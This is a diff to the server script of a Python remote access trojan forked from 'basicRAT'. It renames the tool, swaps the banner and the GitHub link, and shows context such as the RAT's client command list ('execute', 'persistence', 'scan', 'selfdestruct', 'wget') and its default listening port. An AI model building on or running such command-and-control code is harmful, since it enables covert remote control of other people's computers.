@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 #
-# basicRAT server
-# https://github.com/vesche/basicRAT
+# RAT server
+# https://github.com/harshivara/RAT
 #
 
 import argparse
@@ -17,14 +17,14 @@ from core.crypto import encrypt, decrypt, diffiehellman
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
 BANNER = '''
- ____    ____  _____ ____   __  ____    ____  ______      .  ,
-|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
-|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
-|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
-|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
-|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
-|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
-         https://github.com/vesche/basicRAT
+ ____    ____  ______      .  ,
+|    \  /    ||      |    (\;/)
+|  D  )|  o  ||      |   oo   \//,        _
+|    / |     ||_|  |_| ,/_;~      \,     / '
+|    \ |  _  |  |  |   "'    (  (   \    !
+|  .  \|  |  |  |  |         //  \   |__.'
+|__|\_||__|__|  |__|       '~  '~----''
+         https://github.com/harshivara/RAT
 '''
 CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                     'selfdestruct', 'survey', 'unzip', 'wget' ]
@@ -142,7 +142,7 @@ class ClientConnection():
 
 
 def get_parser():
-    parser = argparse.ArgumentParser(description='basicRAT server')
+    parser = argparse.ArgumentParser(description='RAT server')
     parser.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
     return parser
@@ -192,7 +192,7 @@ def main():
         else:
             ccid = '?'
 
-        prompt = raw_input('\n[{}] basicRAT> '.format(ccid)).rstrip()
+        prompt = raw_input('\n[{}] RAT> '.format(ccid)).rstrip()
 
         # allow noop
         if not prompt:
